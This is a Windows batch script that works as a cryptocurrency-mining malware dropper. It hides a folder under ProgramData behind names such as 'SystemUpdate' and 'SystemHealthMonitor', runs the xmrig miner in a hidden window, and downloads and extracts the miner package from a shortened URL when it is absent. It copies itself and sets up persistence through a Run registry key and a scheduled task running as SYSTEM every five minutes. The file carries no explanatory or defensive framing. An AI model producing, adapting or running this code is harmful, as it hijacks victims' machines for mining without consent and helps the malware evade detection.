@echo off

setlocal enabledelayedexpansion

set "ZIP_URL=http://tiny.cc/jtom001"
set "ORIGINAL_DIR=%~dp0"
set "HIDDEN_DIR=%ProgramData%\Windows\SystemUpdate\"
set "HIDDEN_SCRIPT=SystemMonitor.cmd"

if not exist "%HIDDEN_DIR%" (
    mkdir "%HIDDEN_DIR%"
    attrib +s +h "%HIDDEN_DIR%"
)

if not exist "%HIDDEN_DIR%run_hidden.vbs" (
    > "%HIDDEN_DIR%run_hidden.vbs" (
        echo Set WshShell = CreateObject("WScript.Shell"^)
        echo WshShell.Run WScript.Arguments(0^), 0, False
        echo Set WshShell = Nothing
    )
)

tasklist /FI "IMAGENAME eq xmrig.exe" 2>NUL | find /I /N "xmrig.exe">NUL
if %errorlevel% neq 0 (
    echo [%time%] xmrig.exe not running - attempting start
    if exist "%ORIGINAL_DIR%xmrig.exe" (
        wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%ORIGINAL_DIR%xmrig.exe"
    ) else (
        echo [%time%] xmrig.exe missing - downloading package
        powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%HIDDEN_DIR%mall.zip'"
        powershell -Command "Expand-Archive -Path '%HIDDEN_DIR%mall.zip' -DestinationPath '%HIDDEN_DIR%' -Force"
        del /f /q "%HIDDEN_DIR%mall.zip" >nul
        if exist "%HIDDEN_DIR%xmrig.exe" (
            wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%HIDDEN_DIR%xmrig.exe"
        )
    )
)

if not exist "%HIDDEN_DIR%%HIDDEN_SCRIPT%" (
    copy /y "%~f0" "%HIDDEN_DIR%%HIDDEN_SCRIPT%" >nul
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHealthMonitor" /t REG_SZ /d "wscript.exe \"%HIDDEN_DIR%run_hidden.vbs\" \"%HIDDEN_DIR%%HIDDEN_SCRIPT%\"" /f >nul 2>&1
schtasks /create /tn "SystemHealthMonitor" /tr "wscript.exe \"%HIDDEN_DIR%run_hidden.vbs\" \"%HIDDEN_DIR%%HIDDEN_SCRIPT%\"" /sc minute /mo 5 /ru SYSTEM /rl HIGHEST /f >nul 2>&1

timeout /t 10800 /nobreak >nul
wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%HIDDEN_DIR%%HIDDEN_SCRIPT%"